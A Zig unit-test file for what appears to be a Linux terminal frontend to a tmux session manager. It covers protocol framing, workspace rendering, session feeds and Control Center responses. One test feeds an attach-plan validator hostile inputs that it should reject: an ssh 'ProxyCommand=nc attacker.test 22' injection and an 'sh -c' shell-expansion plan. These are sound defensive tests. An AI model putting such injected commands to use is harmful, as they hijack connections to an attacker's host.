    try std.testing.expectError(
        error.PayloadTooLarge,
        framing.encodeLength(framing.max_payload_bytes + 1),
    );
}

test "registration advertises Session feed and desktop Workspace relay without rendering" {
    const json = try protocol.encodeRegistration(
        std.testing.allocator,
        .{
            .frontend_instance_id = "linux-instance-1",
            .frontend_generation = 7,
        },
    );
    defer std.testing.allocator.free(json);
    try std.testing.expectEqualStrings(
        "{\"type\":\"register\",\"frontend_id\":\"linux-ghostty\",\"extensions\":[{\"name\":\"polar_access\",\"version\":1,\"max_payload_bytes\":65536}],\"platform\":\"linux\",\"host_control_versions\":{\"codex\":2,\"notification\":1},\"supported_actions\":[\"activate\"],\"capabilities\":[\"application_state_events_v1\",\"session_feed_v1\",\"workspace_relay_v1\",\"session_lifecycle_v2\"]}",
        json,
    );
}

test "Companion Workspace relay decodes only the native allowlist" {
    var request = try workspace_relay.decode(
        std.testing.allocator,
        "{\"type\":\"workspace_relay\",\"dispatch_id\":\"workspace-dispatch-1\",\"request\":{\"protocol_version\":1,\"api\":\"workspace_v1\",\"request_id\":\"companion-1\",\"scope\":{\"type\":\"catalog\"},\"expected_catalog_revision\":null,\"expected_workspace_revision\":null,\"command\":{\"type\":\"get_catalog\"}}}",
    );
    defer request.deinit();
    try std.testing.expectEqualStrings(
        "workspace-dispatch-1",
        request.dispatch_id,
    );
    try std.testing.expectEqualStrings("companion-1", request.request_id);
    try std.testing.expect(request.command == .get_catalog);
}

test "Companion get catalog returns every native Workspace and catalog revision" {
    var request = try workspace_relay.decode(
        std.testing.allocator,
        "{\"type\":\"workspace_relay\",\"dispatch_id\":\"workspace-dispatch-1\",\"request\":{\"protocol_version\":1,\"api\":\"workspace_v1\",\"request_id\":\"companion-1\",\"scope\":{\"type\":\"catalog\"},\"expected_catalog_revision\":9,\"expected_workspace_revision\":null,\"command\":{\"type\":\"get_catalog\"}}}",
    );
    defer request.deinit();
    const tabs = [_]workspace_rendering.Tab{.{
        .id = "tab-1",
        .title = "Main",
        .display_mode = .monitor,
        .focused_pane_id = null,
        .visual_pane_ids = &.{},
        .layout = .{
            .pane_order = &.{},
            .slots = &.{},
            .fingerprint = "native-owned",
        },
        .panes = &.{},
    }};
    const workspaces = [_]workspace_rendering.Snapshot{
        .{
            .workspace_id = "workspace-1",
            .workspace_name = "Primary",
            .workspace_revision = 4,
            .font_size_points = 14,
            .selected_tab_id = "tab-1",
            .tabs = &tabs,
            .snapshot_fingerprint = "native-1",
        },
        .{
            .workspace_id = "workspace-2",
            .workspace_name = "Operations",
            .workspace_revision = 7,
            .font_size_points = 14,
            .selected_tab_id = "tab-1",
            .tabs = &tabs,
            .snapshot_fingerprint = "native-2",
        },
    };
    const catalog: native_workspace_store.Catalog = .{
        .catalog_revision = 9,
        .selected_workspace_id = "workspace-2",
        .workspaces = &workspaces,
    };
    var sessions = session_runtime.Cache.init(std.testing.allocator);
    defer sessions.deinit();

    const response = try workspace_relay.encodeSuccess(
        std.testing.allocator,
        &request,
        catalog,
        &sessions,
    );
    defer std.testing.allocator.free(response);
    var parsed = try std.json.parseFromSlice(
        std.json.Value,
        std.testing.allocator,
        response,
        .{},
    );
    defer parsed.deinit();
    const root = parsed.value.object;
    const envelope = root.get("response").?.object;
    try std.testing.expectEqual(
        @as(i64, 9),
        envelope.get("revision").?.integer,
    );
    const result = envelope.get("result").?.object;
    const projection = result.get("projection").?.object;
    try std.testing.expectEqual(
        @as(usize, 2),
        projection.get("workspaces").?.array.items.len,
    );
}

test "Linux Session feed accepts one snapshot and only contiguous deltas" {
    var cache = session_runtime.Cache.init(std.testing.allocator);
    defer cache.deinit();
    try cache.applySnapshot(
        "{\"type\":\"session_feed_snapshot\",\"snapshot\":{\"epoch\":\"host-1\",\"revision\":7,\"sessions\":[{\"key\":{\"execution_target\":\"local\",\"tmux_session_id\":\"$1\"},\"display_name\":\"agent\",\"lifecycle\":\"ready\",\"revision\":7}]}}",
    );
    try std.testing.expectEqual(@as(usize, 1), cache.count());
    try std.testing.expectEqual(
        session_runtime.Lifecycle.ready,
        cache.lifecycle("local", "$1").?,
    );
    try cache.applyEvent(
        "{\"type\":\"session_feed_event\",\"event\":{\"epoch\":\"host-1\",\"revision\":8,\"changes\":[{\"type\":\"upsert\",\"session\":{\"key\":{\"execution_target\":\"local\",\"tmux_session_id\":\"$1\"},\"display_name\":\"agent\",\"lifecycle\":\"recovering\",\"revision\":8}}]}}",
    );
    try std.testing.expectEqual(
        session_runtime.Lifecycle.recovering,
        cache.lifecycle("local", "$1").?,
    );
    try std.testing.expectError(
        error.FeedGap,
        cache.applyEvent(
            "{\"type\":\"session_feed_event\",\"event\":{\"epoch\":\"host-1\",\"revision\":10,\"changes\":[{\"type\":\"remove\",\"key\":{\"execution_target\":\"local\",\"tmux_session_id\":\"$1\"}}]}}",
        ),
    );
    const subscribe = try cache.encodeSubscription(std.testing.allocator);
    defer std.testing.allocator.free(subscribe);
    try std.testing.expectEqualStrings(
        "{\"type\":\"subscribe_session_feed\",\"known_epoch\":\"host-1\",\"after_revision\":8}",
        subscribe,
    );
}

test "full Workspace render frame carries logical state without physical ids or operations" {
    const json =
        \\{"type":"render_workspace","transaction_id":"transaction-1","frontend_instance_id":"linux-instance-1","frontend_generation":7,"snapshot":{"schema_version":2,"workspace_id":"workspace-1","workspace_name":"Primary","workspace_revision":9,"managed_terminal_font_size_points":14,"selected_tab_id":"tab-1","tabs":[{"id":"tab-1","title":"Main","display_mode":"focus","focused_pane_id":"pane-2","layout":{"pane_order":["pane-2","pane-1"],"slots":[{"pane_id":"pane-2","canonical_index":0,"visual_index":0,"column":0,"row":0,"width":{"numerator":2,"denominator":3},"height":{"numerator":1,"denominator":1},"role":{"type":"main"}},{"pane_id":"pane-1","canonical_index":1,"visual_index":1,"column":1,"row":0,"width":{"numerator":1,"denominator":3},"height":{"numerator":1,"denominator":1},"role":{"type":"sidebar","slot":1}}],"fingerprint":"focus:pane-2:pane-1"},"panes":[{"id":"pane-1","execution_target_id":"local","tmux_session_id":"$7","transport_status":"online","attach_fingerprint":"attach-local-7","attach_plan":{"program":"tmux","args":["attach-session","-t","$7"]}},{"id":"pane-2","execution_target_id":"remote","tmux_session_id":"$8","transport_status":"recovering","attach_fingerprint":"attach-remote","attach_plan":{"program":"ssh","args":["-S","/run/user/1000/polar-tmux/ssh/remote/control.sock","-o","ProxyCommand=/usr/bin/false","-tt","operator@example.test","tmux attach-session -t '$8'"]}}]}],"snapshot_fingerprint":"snapshot-9","error":null}}
    ;
    var request = try workspace_rendering.RenderRequest.parse(
        std.testing.allocator,
        json,
        .{
            .frontend_instance_id = "linux-instance-1",
            .frontend_generation = 7,
        },
    );
    defer request.deinit();

    try std.testing.expectEqualStrings("transaction-1", request.transaction_id);
    try std.testing.expectEqualStrings("workspace-1", request.snapshot.workspace_id);
    try std.testing.expectEqual(@as(u64, 9), request.snapshot.workspace_revision);
    try std.testing.expectEqual(@as(u8, 14), request.snapshot.font_size_points);
    try std.testing.expectEqual(@as(usize, 1), request.snapshot.tabs.len);
    try std.testing.expect(request.snapshot.tabs[0].display_mode == .focus);
    try std.testing.expectEqualStrings(
        "pane-2",
        request.snapshot.tabs[0].focused_pane_id.?,
    );
    try std.testing.expectEqualStrings(
        "attach-remote",
        request.snapshot.tabs[0].panes[1].attach_fingerprint,
    );
    try std.testing.expect(
        request.snapshot.tabs[0].panes[1].transport_status == .recovering,
    );
}

test "Monitor Workspace render accepts Panes without a semantic Focus main" {
    const focus_json =
        \\{"type":"render_workspace","transaction_id":"transaction-monitor","frontend_instance_id":"linux-instance-1","frontend_generation":7,"snapshot":{"schema_version":2,"workspace_id":"workspace-1","workspace_name":"Primary","workspace_revision":9,"managed_terminal_font_size_points":14,"selected_tab_id":"tab-1","tabs":[{"id":"tab-1","title":"Main","display_mode":"focus","focused_pane_id":"pane-1","layout":{"pane_order":["pane-1"],"slots":[{"pane_id":"pane-1","canonical_index":0,"visual_index":0,"column":0,"row":0,"width":{"numerator":1,"denominator":1},"height":{"numerator":1,"denominator":1},"role":{"type":"main"}}],"fingerprint":"focus:pane-1"},"panes":[{"id":"pane-1","execution_target_id":"local","tmux_session_id":"$7","transport_status":"online","attach_fingerprint":"attach-local-7","attach_plan":{"program":"tmux","args":["attach-session","-t","$7"]}}]}],"snapshot_fingerprint":"snapshot-monitor","error":null}}
    ;
    const monitor_json = try std.mem.replaceOwned(
        u8,
        std.testing.allocator,
        focus_json,
        "\"display_mode\":\"focus\",\"focused_pane_id\":\"pane-1\"",
        "\"display_mode\":\"monitor\",\"focused_pane_id\":null",
    );
    defer std.testing.allocator.free(monitor_json);
    var request = try workspace_rendering.RenderRequest.parse(
        std.testing.allocator,
        monitor_json,
        .{
            .frontend_instance_id = "linux-instance-1",
            .frontend_generation = 7,
        },
    );
    defer request.deinit();
    try std.testing.expect(request.snapshot.tabs[0].display_mode == .monitor);
    try std.testing.expect(request.snapshot.tabs[0].focused_pane_id == null);
}

test "Workspace render receipt returns only logical transaction acknowledgement" {
    const json = try workspace_rendering.encodeAppliedReceipt(
        std.testing.allocator,
        .{
            .frontend_instance_id = "linux-instance-1",
            .frontend_generation = 7,
        },
        "transaction-1",
        "workspace-1",
        9,
        "snapshot-9",
    );
    defer std.testing.allocator.free(json);
    try std.testing.expectEqualStrings(
        "{\"type\":\"workspace_rendered\",\"receipt\":{\"transaction_id\":\"transaction-1\",\"frontend_instance_id\":\"linux-instance-1\",\"frontend_generation\":7,\"workspace_id\":\"workspace-1\",\"workspace_revision\":9,\"snapshot_fingerprint\":\"snapshot-9\",\"result\":{\"status\":\"applied\"}}}",
        json,
    );
    try std.testing.expect(std.mem.indexOf(u8, json, "physical_") == null);
    try std.testing.expect(std.mem.indexOf(u8, json, "\"steps\"") == null);
}

test "application-state frames are typed and require non-zero revisions" {
    const identity: protocol.FrontendIdentity = .{
        .frontend_instance_id = "linux-instance-1",
        .frontend_generation = 7,
    };
    const json =
        "{\"type\":\"application_state_changed\",\"api\":\"control_center_v1\",\"state_revision\":41}";
    try std.testing.expectEqual(
        protocol.HostFrameKind.application_state_changed,
        try protocol.classifyHostFrame(
            std.testing.allocator,
            json,
            identity,
        ),
    );
    try std.testing.expectEqual(
        protocol.ApplicationStateChange{
            .api = .control_center_v1,
            .state_revision = 41,
        },
        try protocol.decodeApplicationStateChange(
            std.testing.allocator,
            json,
        ),
    );
    try std.testing.expectError(
        error.InvalidFrame,
        protocol.decodeApplicationStateChange(
            std.testing.allocator,
            "{\"type\":\"application_state_changed\",\"api\":\"resources_v1\",\"state_revision\":0}",
        ),
    );
}

test "Control Center response outcome distinguishes accepted from rejection" {
    const accepted =
        "{\"type\":\"application_response\",\"response\":{\"protocol_version\":1,\"api\":\"control_center_v1\",\"request_id\":\"linux-accepted\",\"control_revision\":8,\"result\":{\"type\":\"intent_accepted\",\"projection\":{}}}}";
    var accepted_outcome = try protocol.decodeControlCenterResponseOutcome(
        std.testing.allocator,
        accepted,
    );
    defer accepted_outcome.deinit(std.testing.allocator);
    try std.testing.expectEqualStrings(
        "linux-accepted",
        accepted_outcome.request_id,
    );
    try std.testing.expectEqual(
        protocol.ControlCenterResponseKind.intent_accepted,
        accepted_outcome.kind,
    );

    const rejected =
        "{\"type\":\"application_response\",\"response\":{\"protocol_version\":1,\"api\":\"control_center_v1\",\"request_id\":\"linux-rejected\",\"control_revision\":7,\"result\":{\"type\":\"error\",\"error\":{\"code\":\"stale_revision\",\"message\":\"stale\"},\"projection\":null}}}";
    var rejected_outcome = try protocol.decodeControlCenterResponseOutcome(
        std.testing.allocator,
        rejected,
    );
    defer rejected_outcome.deinit(std.testing.allocator);
    try std.testing.expectEqual(
        protocol.ControlCenterResponseKind.@"error",
        rejected_outcome.kind,
    );

    try std.testing.expect(accepted_outcome.error_message == null);
    try std.testing.expectEqualStrings("stale", rejected_outcome.error_message.?);

    const structure_accepted =
        "{\"type\":\"application_response\",\"response\":{\"protocol_version\":1,\"api\":\"control_center_v1\",\"request_id\":\"linux-structure\",\"control_revision\":8,\"result\":{\"type\":\"structure_accepted\",\"structure\":{}}}}";
    var structure_outcome = try protocol.decodeControlCenterResponseOutcome(
        std.testing.allocator,
        structure_accepted,
    );
    defer structure_outcome.deinit(std.testing.allocator);
    try std.testing.expect(structure_outcome.kind.accepted());
}

test "application refresh coalesces events without polling or dropping the newest revision" {
    var gate: application_refresh.Gate = .{};

    try std.testing.expectEqual(
        application_refresh.Effect.request_projection,
        gate.observe(41),
    );
    try std.testing.expectEqual(
        application_refresh.Effect.none,
        gate.observe(42),
    );
    try std.testing.expectEqual(
        application_refresh.Effect.none,
        gate.observe(41),
    );
    try std.testing.expectEqual(
        application_refresh.Effect.request_projection,
        gate.complete(),
    );
    try std.testing.expectEqual(
        application_refresh.Effect.none,
        gate.complete(),
    );
    try std.testing.expectEqual(@as(u64, 42), gate.last_revision);
}

test "Host frame classification rejects retired Workspace render frames" {
    const identity: protocol.FrontendIdentity = .{
        .frontend_instance_id = "linux-instance-1",
        .frontend_generation = 7,
    };
    try std.testing.expectError(
        error.UnsupportedFrame,
        protocol.classifyHostFrame(
            std.testing.allocator,
            "{\"type\":\"render_workspace\",\"transaction_id\":\"transaction-1\",\"frontend_instance_id\":\"linux-instance-1\",\"frontend_generation\":7}",
            identity,
        ),
    );
    try std.testing.expectError(
        error.UnsupportedFrame,
        protocol.classifyHostFrame(
            std.testing.allocator,
            "{\"type\":\"render_workspace\",\"transaction_id\":\"transaction-1\",\"frontend_instance_id\":\"other-instance\",\"frontend_generation\":7}",
            identity,
        ),
    );
}

test "attach argv accepts exact Host grammar and rejects shell expansion" {
    try attach_argv.validate(.{
        .program = "tmux",
        .args = &.{
            "-L",
            "polar-managed",
            "attach-session",
            "-t",
            "$7",
        },
    }, "$7");
    try attach_argv.validate(.{
        .program = "ssh",
        .args = &.{
            "-S",
            "/run/user/1000/polar-tmux/ssh/remote/control.sock",
            "-o",
            "ProxyCommand=/usr/bin/false",
            "-tt",
            "operator@example.test",
            "tmux attach-session -t '$7'",
        },
    }, "$7");
    try std.testing.expectError(
        error.InvalidAttachPlan,
        attach_argv.validate(.{
            .program = "ssh",
            .args = &.{ "-tt", "operator@example.test", "tmux attach-session -t '$7'" },
        }, "$7"),
    );
    try std.testing.expectError(
        error.InvalidAttachPlan,
        attach_argv.validate(.{
            .program = "ssh",
            .args = &.{
                "-S",
                "/run/user/1000/polar-tmux/ssh/remote/control.sock",
                "-o",
                "ProxyCommand=nc attacker.test 22",
                "-tt",
                "operator@example.test",
                "tmux attach-session -t '$7'",
            },
        }, "$7"),
    );
    try std.testing.expectError(
        error.InvalidAttachPlan,
        attach_argv.validate(.{
            .program = "sh",
            .args = &.{ "-c", "tmux attach-session -t $7" },
        }, "$7"),
    );
    try std.testing.expectError(
        error.SessionMismatch,
        attach_argv.validate(.{
            .program = "tmux",
            .args = &.{ "attach-session", "-t", "$8" },
        }, "$7"),
    );
}

test "authoritative snapshot reactivates its retained terminal binding" {
    const Binding = struct {
        pane_id: []const u8,
        tab_id: []const u8,
        attach_fingerprint: []const u8,
        active: bool,
    };
    const bindings = [_]Binding{
        .{
            .pane_id = "pane-1",
            .tab_id = "tab-1",
            .attach_fingerprint = "old",
            .active = false,
        },
        .{
            .pane_id = "pane-1",
            .tab_id = "tab-1",
            .attach_fingerprint = "candidate",
            .active = true,
        },
    };

    const decision = workspace_reconciliation.paneBindingDecision(
        &bindings,
        "pane-1",
        "tab-1",
        "old",
    );
    try std.testing.expect(decision == .reactivate);
    try std.testing.expectEqual(@as(usize, 0), decision.reactivate);
}

test "unchanged exact terminal binding is a native no-op" {
    _ = resources.Model;
    const Binding = struct {
        pane_id: []const u8,
        tab_id: []const u8,
        attach_fingerprint: []const u8,
        active: bool,
    };
    const bindings = [_]Binding{.{
        .pane_id = "pane-1",
        .tab_id = "tab-1",
        .attach_fingerprint = "same",
        .active = true,
    }};

    const decision = workspace_reconciliation.paneBindingDecision(
        &bindings,
        "pane-1",
        "tab-1",
        "same",
    );
    try std.testing.expect(decision == .reuse_active);
    try std.testing.expectEqual(@as(usize, 0), decision.reuse_active);
}

test "native layout operations never encode Host control requests" {
    const actions = [_]control_center_intent.Action{
        .{ .add_tab = .{ .title = "Main", .tab_id = "native-tab" } },
        .{ .remove_pane = .{ .pane_id = "native-pane" } },
        .{ .toggle_session_assignment = .{ .execution_target_id = "local", .tmux_session_id = "$34", .tab_id = "native-tab", .pane_id = "native-pane" } },
        .{ .select_workspace = .{ .workspace_id = "native-workspace" } },
    };
    for (actions) |action| try std.testing.expectError(error.NativeActionMustNotReachHost, control_center_intent.encodeAction(std.testing.allocator, "test", "native", 0, action));
}

test "Session control encodes exact identity without Pane or Tab fields" {
    const payload = try control_center_intent.encodeAction(std.testing.allocator, "test", "native", 0, .{ .restart_session = .{ .execution_target_id = "local", .tmux_session_id = "$34" } });
    defer std.testing.allocator.free(payload);
    var parsed = try std.json.parseFromSlice(std.json.Value, std.testing.allocator, payload, .{});
    defer parsed.deinit();
    const intent = parsed.value.object.get("request").?.object.get("command").?.object.get("intent").?.object;
    try std.testing.expectEqualStrings("restart_session", intent.get("intent").?.string);
    try std.testing.expectEqualStrings("$34", intent.get("tmux_session_id").?.string);
    try std.testing.expect(!intent.contains("pane_id") and !intent.contains("tab_id") and !intent.contains("workspace_id"));
}

test "Codex capability registration and state events decode without breaking legacy Host" {
    const allocator = std.testing.allocator;
    const host = try protocol.decodeRegisteredHostId(allocator, "{\"type\":\"registered\",\"registration_id\":\"r\",\"protocol_version\":1,\"host_id\":\"owner\",\"host_control_versions\":{\"codex\":2,\"notification\":1}}");
    defer allocator.free(host);
    try std.testing.expectEqualStrings("owner", host);
    const event = try protocol.decodeApplicationStateChange(allocator, "{\"type\":\"application_state_changed\",\"api\":\"codex_v1\",\"state_revision\":3}");
    try std.testing.expectEqualStrings("codex_v1", @tagName(event.api));
}

test "Control Center rejection outcome owns failure independently of IPC bytes and refreshed projection" {
    const json = try std.testing.allocator.dupe(
        u8,
        "{\"type\":\"application_response\",\"response\":{\"api\":\"control_center_v1\",\"request_id\":\"rename-rejected\",\"result\":{\"type\":\"error\",\"error\":{\"code\":\"session_name_conflict\",\"message\":\"a tmux session with this name already exists\"}}}}",
    );
    defer std.testing.allocator.free(json);
    var outcome = try protocol.decodeControlCenterResponseOutcome(std.testing.allocator, json);
    defer outcome.deinit(std.testing.allocator);
    @memset(json, 'x');
    try std.testing.expectEqualStrings("rename-rejected", outcome.request_id);
    try std.testing.expectEqualStrings("a tmux session with this name already exists", outcome.error_message.?);
}

test "negotiated chat extensions preserve native desktop registration" {
    const allocator = std.testing.allocator;
    for ([_][]const u8{ "[]", "[{\"name\":\"polar_access\",\"version\":1,\"max_payload_bytes\":65536}]" }) |extensions| {
        const frame = try std.fmt.allocPrint(allocator, "{{\"type\":\"registered\",\"registration_id\":\"r\",\"protocol_version\":1,\"host_id\":\"owner\",\"extensions\":{s}}}", .{extensions});
        defer allocator.free(frame);
        const host = try protocol.decodeRegisteredHostId(allocator, frame);
        defer allocator.free(host);
        try std.testing.expectEqualStrings("owner", host);
    }
    try std.testing.expectError(error.UnknownField, protocol.decodeRegisteredHostId(allocator, "{\"type\":\"registered\",\"registration_id\":\"r\",\"protocol_version\":1,\"host_id\":\"owner\",\"unexpected\":true}"));
}

test "registration keeps base controls available with absent or unsupported chat" {
    const allocator = std.testing.allocator;
    for ([_][]const u8{ "", ",\"extensions\":[{\"name\":\"polar_access\",\"version\":2,\"max_payload_bytes\":65536}]" }) |extensions| {
        const frame = try std.fmt.allocPrint(allocator, "{{\"type\":\"registered\",\"registration_id\":\"r\",\"protocol_version\":1,\"host_id\":\"owner\",\"host_control_versions\":{{\"codex\":2}}{s}}}", .{extensions});
        defer allocator.free(frame);
        var registration = try protocol.decodeRegisteredFrame(allocator, frame);
        defer registration.deinit();
        try std.testing.expectEqualStrings("owner", registration.value.host_id);
        try std.testing.expect(registration.value.host_control_versions.?.codex == 2);
        try std.testing.expect(!registration.value.supportsPolarAccess());
    }
}

test "Resources preserves Host rejection after response bytes are released" {
    const allocator = std.testing.allocator;
    var model = resources.Model.init(allocator);
    defer model.deinit();
    const bytes = try allocator.dupe(u8, "{\"type\":\"application_response\",\"response\":{\"protocol_version\":1,\"api\":\"resources_v1\",\"request_id\":\"apply-1\",\"revision\":0,\"result\":{\"type\":\"error\",\"error\":{\"code\":\"resource_target_not_ssh\",\"message\":\"Resources require a registered SSH execution target.\",\"retryable\":false}}}}");
    defer allocator.free(bytes);
    var outcome = try model.applyResponse(bytes);
    defer outcome.deinit(allocator);
    @memset(bytes, 'x');
    try std.testing.expectEqual(resources.ResponseKind.@"error", outcome.kind);
    try std.testing.expectEqualStrings("Resources require a registered SSH execution target.", outcome.error_message.?);
    try std.testing.expectEqual(@as(u64, 0), outcome.revision);
}

test "Resources retained projection owns strings after IPC buffer reuse" {
    const payload = try std.testing.allocator.dupe(u8,
        \\{"type":"application_response","response":{"protocol_version":1,"api":"resources_v1","request_id":"ownership-test","revision":0,"event_revision":1,"result":{"type":"projection","projection":{"schema_version":1,"revision":0,"catalog":{"schema_version":1,"revision":0,"file_mappings":[],"port_forwards":[],"android_mirrors":[]},"entries":[],"available_target_ids":["fixture-target"],"has_pending_draft":false,"apply_label":"Apply","aggregate_message":"Resources ready"}}}}
    );
    defer std.testing.allocator.free(payload);
    var model = @import("resources.zig").Model.init(std.testing.allocator);
    defer model.deinit();
    var outcome = try model.applyResponse(payload);
    defer outcome.deinit(std.testing.allocator);
    @memset(payload, 'X');
    try std.testing.expectEqualStrings("Resources ready", model.projection().?.aggregate_message);
}

test "Settings retained projection owns strings after IPC buffer reuse" {
    const payload = try std.testing.allocator.dupe(u8,
        \\{"type":"application_response","response":{"protocol_version":1,"api":"settings_v1","request_id":"ownership-test","revision":0,"event_revision":1,"result":{"kind":"projection","projection":{"schema_version":1,"revision":0,"appearance":{"terminal_delivery_mode":"insert"},"attention":{},"session_summary":{"command":"fixture-command"}}}}}
    );
    defer std.testing.allocator.free(payload);
    var model = @import("settings.zig").Model.init(std.testing.allocator);
    defer model.deinit();
    try model.applyResponse(payload);
    @memset(payload, 'X');
    try std.testing.expectEqualStrings("fixture-command", model.projection().?.session_summary.command);
}

test "Inbox retained projection owns strings after IPC buffer reuse" {
    const payload = try std.testing.allocator.dupe(u8,
        \\{"type":"application_response","response":{"protocol_version":1,"api":"inbox_v1","request_id":"ownership-test","revision":0,"event_revision":1,"result":{"kind":"page","page":{"messages":[{"id":"m","origin":{"workspace_id":"w","tab_id":"t","pane_id":"p","execution_target_id":"local","tmux_session_id":"s","consumer_generation":1,"native_recovery_token":"token"},"session_label":"Fixture","attention":"review","summary":"Inbox retained message","created_at_ms":1,"revision":1,"unread":true,"draft_status":"none","stale_context":false}],"unread_count":1}}}}
    );
    defer std.testing.allocator.free(payload);
    var model = @import("inbox.zig").Model.init(std.testing.allocator);
    defer model.deinit();
    _ = try model.applyResponse(payload);
    @memset(payload, 'X');
    try std.testing.expectEqualStrings("Inbox retained message", model.page().?.messages[0].summary);
}

test "Connections preserves individual SSH states independently of config revision" {
    const json =
        \\{"revision":"saved-1","machines":[],"polar_instances":[],"machine_statuses":[{"id":"linux","connection":{"status":"connected","label":"Connected","route":"wan","accessibility_label":"Linux: SSH connected"}},{"id":"dev06","connection":{"status":"offline","label":"Offline","accessibility_label":"dev06: SSH offline"}}]}
    ;
    const facts = try std.json.parseFromSlice(control_center_model.Connections, std.testing.allocator, json, .{});
    defer facts.deinit();
    try std.testing.expectEqualStrings("saved-1", facts.value.revision);
    try std.testing.expectEqualStrings("connected", facts.value.machine_statuses[0].connection.status);
    try std.testing.expectEqualStrings("offline", facts.value.machine_statuses[1].connection.status);
}

test "quick create carries source kind and initiating frontend and decodes exact Session receipt" {
    const a = std.testing.allocator;
    for ([_]bool{false, true}) |codex| {
        const payload = try control_center_intent.encodeAction(a, "quick-test", "frontend-test", 7, .{ .quick_create_session = .{
            .kind = if (codex) .codex else .shell,
            .execution_target_id = "local",
            .source_session_id = "station-session-original",
        } });
        defer a.free(payload);
        const parsed = try std.json.parseFromSlice(std.json.Value, a, payload, .{});
        defer parsed.deinit();
        const request = parsed.value.object.get("request").?.object;
        const intent = request.get("command").?.object.get("intent").?.object;
        try std.testing.expectEqualStrings(if (codex) "codex" else "shell", intent.get("kind").?.string);
        try std.testing.expectEqualStrings("station-session-original", intent.get("source_session_id").?.string);
        try std.testing.expectEqualStrings("frontend-test", request.get("frontend_session_id").?.string);
    }
    var receipt = try protocol.decodeControlCenterResponseOutcome(a,
        \\{"type":"application_response","response":{"api":"control_center_v1","request_id":"quick-test","result":{"type":"session_created","session":{"execution_target_id":"local","tmux_session_id":"station-session-new"}}}}
    );
    defer receipt.deinit(a);
    try std.testing.expectEqualStrings("station-session-new", receipt.session.?.tmux_session_id);
    var failure = try protocol.decodeControlCenterResponseOutcome(a,
        \\{"type":"application_response","response":{"api":"control_center_v1","request_id":"quick-test","result":{"type":"error","error":{"code":"endpoint_required","message":"Choose an endpoint"}}}}
    );
    defer failure.deinit(a);
    try std.testing.expect(failure.session == null);
    try std.testing.expectEqualStrings("Choose an endpoint", failure.error_message.?);
}

test "Layout cards use the full width inside a single list inset" {
    for ([_]c_int{ 200, 300, 390 }) |width| {
        try std.testing.expectEqual(width - 24, control_center_layout.layoutMapPaneBodyWidth(width));
        for ([_]control_center_model.DisplayMode{ .focus, .monitor }) |mode| {
            const card = control_center_layout.tabCardLayoutForMapWidth(mode, 2, 2, width);
            try std.testing.expectEqual(@as(c_int, 32), card.header_height);
            try std.testing.expect(card.body_height > 0);
        }
    }
}
